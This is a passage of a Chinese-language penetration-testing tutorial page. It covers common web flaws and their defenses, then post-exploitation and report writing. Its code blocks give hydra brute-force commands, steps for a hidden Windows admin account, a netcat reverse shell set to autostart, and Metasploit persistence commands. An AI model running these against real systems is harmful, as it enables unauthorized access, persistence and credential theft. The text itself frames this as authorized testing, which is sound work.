+  <strong>其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong>，还需要注意的是如后端语句使用了<code class="highlighter-rouge">insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br />
+  何防止SQL注入：<br /></p>
+    <ul>
+      <li>不信任用户的输入；</li>
+      <li>不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；</li>
+      <li>不使用管理员权限的数据库连接；</li>
+      <li>对机密信息进行加密或hash掉密码和敏感信息；</li>
+      <li>应用异常尽可能少在web提示，最好使用自定义信息对应用的异常信息进行包装；</li>
+      <li>采用工具或网络平台检测是否存在SQL注入。</li>
+    </ul>
+  </li>
+  <li>
+    <p>xss漏洞</p>
+
+    <p><strong>定义</strong>：恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br />
+  前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过<br />
+  如何防止XSS跨站脚本攻击：（原则是不相信用户输入的数据）<br /></p>
+    <ul>
+      <li>将重要的cookies标记为http only，这样JavaScript中的document.cookie语句就不能获取到cookie了；</li>
+      <li>只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；</li>
+      <li>对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；</li>
+      <li>过滤或移除特殊的Html标签，如：script、iframe；</li>
+      <li>过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。</li>
+    </ul>
+  </li>
+  <li>
+    <p>上传漏洞</p>
+
+    <p>各种web中间件解析漏洞，各类编辑器漏洞利用，bypass上传检测（黑名单、白名单配合解析漏洞、阶段、.htaccess自解析、配合本地包含漏洞一起利用</p>
+
+    <p>更多<a href="https://www.pa55w0rd.club/2018/10/19/fileupload/">《文件上传漏洞总结》</a></p>
+  </li>
+  <li>
+    <p>xxe漏洞</p>
+
+    <p>xxe漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等</p>
+  </li>
+  <li>
+    <p>逻辑漏洞</p>
+
+    <p>逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
+  </li>
+  <li>
+    <p>csrf</p>
+
+    <p><strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br />
+  检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户，poc可以通过burpsuite去生成<br /></p>
+
+    <p>如何防止CSRF跨站请求攻击：<br /></p>
+    <ul>
+      <li>在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；</li>
+      <li>验证码，强化用户与应用的交互，但不是任何请求都加验证码；</li>
+      <li>在HTTP头中自定义属性并验证 + One time tokens；</li>
+      <li>检查请求header中的referer也能帮助组织CSRF攻击，但服务器不是总能拿到referer，有些浏览器出于安全会隐私考虑会不发referer，所以也不常用；</li>
+      <li>在浏览其它站点前退出登录站点或者浏览结束后清理浏览器cookies；</li>
+      <li>生成一个随机的token，在用户提交数据的同时提交这个token，服务器端对比后如果不正确，则拒绝执行操作。</li>
+    </ul>
+  </li>
+  <li>
+    <p>未授权访问</p>
+
+    <p>这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
+  </li>
+  <li>
+    <p>弱口令</p>
+
+    <p>可以通过爆破的方式发现弱口令，web可以使用burpsuite，服务可以使用hydra</p>
+
+    <p><strong>hydra简单使用</strong></p>
+
+    <p>项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
+
+    <p>hydra可以运行在Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS</p>
+
+    <p>支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code>  -R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破
+  -S 	爆破https时需要加上该选项
+  -s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号
+  -l/-L 	指定用户名 / 指定用户名字典文件
+  -p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]
+  -e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]
+  -f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个'进程'退出,-F表示全局退出
+  -t 	指定爆破进程,实际爆破中给8个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧
+  -w 	设定超时时长,默认32秒,一般情况10秒即可
+  -4/-6 	4表示用ipv4,6表示用ipv6
+  -v 	显示爆破信息
+  -M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式
+</code></pre>
+    </div>
+    <p>针对各类服务的实例爆破演示</p>
+    <div class="highlighter-rouge"><pre class="highlight"><code>  # hydra -L user.txt -P pass.txt -f -v -t 20 mssql://192.168.1.2
+  # hydra -l root -P pass.txt -f -v -t 20 mysql://192.168.1.2
+  # hydra -L user.txt -P pass.txt -f -v -t 20 smb://192.168.1.2
+  # hydra -L user.txt -P pass.txt -f -v -t 20 postgres://192.168.1.2
+  # hydra -L user.txt -P pass.txt -f -v -t 20 rdp://192.168.1.2
+  # hydra -l root -P pass.txt -f -v -t 20 ssh://192.168.1.2
+  # hydra -L user.txt -P pass.txt -f -v -t 20 ftp://192.168.1.2
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>越权访问</p>
+
+    <p>越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
+  </li>
+  <li>
+    <p>各种框架漏洞</p>
+
+    <p>比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证</p>
+  </li>
+  <li>
+    <p>信息泄露</p>
+
+    <p>信息泄露即通过各种搜索手段或者查看robots.txt之类的敏感目录得到敏感信息</p>
+  </li>
+  <li>
+    <p>文件包含</p>
+
+    <p>当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell</p>
+
+    <p>远程文件包含拿shell，本地包含读取文件</p>
+  </li>
+  <li>
+    <p>命令注入</p>
+
+    <p><strong>定义</strong>：针对操作系统，即能够在服务器上执行任意命令。从Web应用中通过Shell来调用操作系统命令，如果在Shell调用时存在漏洞，就可以执行攻击者的非法OS命令<br />
+  命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨。<br />
+  如何防止OS注入：<br /></p>
+    <ul>
+      <li>不调用外部程序；</li>
+      <li>
+        <table>
+          <tbody>
+            <tr>
+              <td>过滤掉、；，[,],</td>
+              <td>,&lt;,&gt;,\之类的符号；</td>
+            </tr>
+          </tbody>
+        </table>
+      </li>
+      <li>设置用户的权限。</li>
+    </ul>
+  </li>
+  <li>
+    <p>SSRF</p>
+
+    <p>ServerSide Request Forgery 的简写，允许 Web Interface 请求受保护网络内的资源。</p>
+  </li>
+</ul>
+
+<p>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</p>
+
+<h2 id="0x04-漏洞验证">0x04 漏洞验证</h2>
+
+<p>尽可能的由浅入深，旁敲侧推，尽可能的将漏洞的价值发挥到最大化，比如说挖到一枚self-xss ，这个漏洞一般会被忽略，如果说结合csrf漏洞的话那么就是一个中危漏洞了<br />
+再比如说拿到一个企业的邮箱账户，我们可以对其vpn爆破然后进行内网探测等等都是可行的。</p>
+
+<h2 id="0x05-后渗透阶段">0x05 后渗透阶段</h2>
+
+<p>后渗透测试包括内网渗透，权限维持，权限提升，读取用户hash，浏览器密码等等，一般都是点到为止，不会深入。<strong>这里需要注意，是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong></p>
+
+<ul>
+  <li>
+    <p>提权</p>
+
+    <p>提权方便进行内网渗透</p>
+
+    <ul>
+      <li>
+        <p>系统漏洞提权</p>
+
+        <ul>
+          <li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>，参考<a href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki/windows-kernel-exploits</a></li>
+          <li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a href="https://github.com/SecWiki/linux-kernel-exploits">SecWiki/linux-kernel-exploits</a></li>
+          <li><strong>MacOS平台:</strong> 参考<a href="https://github.com/SecWiki/macos-kernel-exploits">SecWiki/macos-kernel-exploits</a></li>
+        </ul>
+      </li>
+      <li>
+        <p>数据库提权</p>
+
+        <p>利用数据库系统命令执行获取shell，或数据库漏洞如<a href="https://www.cnblogs.com/coderlee/archive/2009/07/18/1526229.html">mssql的job提权</a>、<a href="https://www.cnblogs.com/wh4am1/p/6613770.html">mysql的mof提权</a></p>
+      </li>
+      <li>
+        <p>web中间件漏洞提权</p>
+
+        <p>IIS溢出、tomcat提权</p>
+      </li>
+      <li>
+        <p>第三方软件提权</p>
+
+        <p>Filezllia提权、搜狗拼音提权</p>
+      </li>
+      <li>
+        <p>系统错误配置提权</p>
+
+        <p>在windows下可以使用BeRoot工具进行系统配置检查，利用配置错误点进行提权。</p>
+      </li>
+      <li>
+        <p>获取或嗅探高权限账号提权</p>
+
+        <p>利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>权限维持</p>
+
+    <p>当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就显得很重要了。</p>
+
+    <ul>
+      <li>构造隐蔽的WEB漏洞方式维持权限，如文件包含漏洞</li>
+      <li>webshell</li>
+      <li>
+        <p>账号维权，获取用户名密码，或自建隐藏账号</p>
+
+        <p>Window 影子账号创建</p>
+        <div class="highlighter-rouge"><pre class="highlight"><code>  1. 通过net user xxx$ 123 /add 
+  2. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值0x1f4找到左侧对应得文件夹即000001F4，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和00000XXX 导出注册表
+  3. 接着删除xxx$ 用户 net user xxx$ /del
+  4. 双击导入刚才导出的两个注册表
+</code></pre>
+        </div>
+      </li>
+      <li>
+        <p>msf / nc / <a href="https://github.com/EmpireProject/Empire">PowerShell Empire</a>  / <a href="https://github.com/zerosum0x0/koadic">大宝剑Koadic</a> / Cobalt strike</p>
+
+        <p>nc</p>
+
+        <div class="highlighter-rouge"><pre class="highlight"><code>  服务器监听4444端口 nc -lvvp 4444
+
+  目标执行 nc -t -e cmd.exe x.x.x.x 4444 ，并添加开机启动
+</code></pre>
+        </div>
+        <p>msf</p>
+        <div class="highlighter-rouge"><pre class="highlight"><code>  先获得一个Meterpretershell
+  利用 Persistence模块
+  run persistence -U -i 10 -p 4444 -r x.x.x.x
+        
+      -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；
+      -i：设置反向连接间隔时间，单位为秒；
+      -p：设置反向连接的端口号；
+      -r：设置反向连接的ip地址。
+
+  Metsvc 模块
+
+  run metsvc -A
+  直接在目标主机上开启一个服务
+  利用handler下的windows/metsvc_bind_tcp模块，重新获得shell
+</code></pre>
+        </div>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>内网渗透</p>
+
+    <p>网络拓扑探测</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code>  安全域、防火墙、ids/ips
+</code></pre>
+    </div>
+
+    <p>内网弱口令
+  内网服务器漏洞
+  内网网络设备漏洞
+  内网个人终端漏洞</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code>  系统层ms17-010等   office漏洞     
+</code></pre>
+    </div>
+
+    <p>内网钓鱼
+  中间人攻击
+  内网穿透</p>
+  </li>
+</ul>
+
+<h2 id="0x06-报告编写">0x06 报告编写</h2>
+
+<p>一个好的渗透测试报告至关重要。
+只有编写完渗透测试报告这次渗透测试才算完全结束。<br />
+首先你需要明确漏洞名称以及漏洞原理。
+其次要注明参与人员，测试时间，内网外网<br /></p>
+<ul>
+  <li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li>
+  <li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li>
+  <li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li>
+</ul>
+
+<h2 id="0x07-风险规避">0x07 风险规避</h2>
+
+<ol>
+  <li>不要进行诸如ddos攻击，不破坏数据</li>
+  <li>测试之前对重要数据进行备份</li>
+  <li>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦</li>
+  <li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
+  <li>明确渗透测试范围</li>
+</ol>
+
+    </div>
+    
+
+	
+	<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+	
+
+
+	<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://pa55w0rd.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<script id="dsq-count-scr" src="//pa55w0rd.disqus.com/count.js" async></script>
+
+
+  </div>
+  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<!--
+<script language=JavaScript>
+
+var caution = false
+function setCookie(name, value, expires, path, domain, secure) {
+var curCookie = name + "=" + escape(value) +
+((expires) ? "; expires=" + expires.toGMTString() : "") +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+((secure) ? "; secure" : "")
+if (!caution || (name + "=" + escape(value)).length <= 4000)
+document.cookie = curCookie
+else
+if (confirm("Cookie exceeds 4KB and will be cut!"))
+document.cookie = curCookie
+}
+function getCookie(name) {
+var prefix = name + "="
+var cookieStartIndex = document.cookie.indexOf(prefix)
+if (cookieStartIndex == -1)
+return null
+var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
+if (cookieEndIndex == -1)
+cookieEndIndex = document.cookie.length
+return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
+}
+function deleteCookie(name, path, domain) {
+if (getCookie(name)) {
+document.cookie = name + "=" +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+"; expires=Thu, 01-Jan-70 00:00:01 GMT"
+}
+}
+function fixDate(date) {
+var base = new Date(0)
+var skew = base.getTime()
+if (skew > 0)
+date.setTime(date.getTime() - skew)
+}
+var now = new Date()
+fixDate(now)
+now.setTime(now.getTime() + 365 * 24 * 60 * 60 * 1000)
+var visits = getCookie("counter")
+if (!visits)
+visits = 1
+else
+visits = parseInt(visits) + 1
+setCookie("counter", visits, now)
+document.write("您是第" + visits + "位访问本篇文章的！")
+
+</script>
+-->
+
+</article>
+
+    </div>
+  </main>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+</body>
+</html>
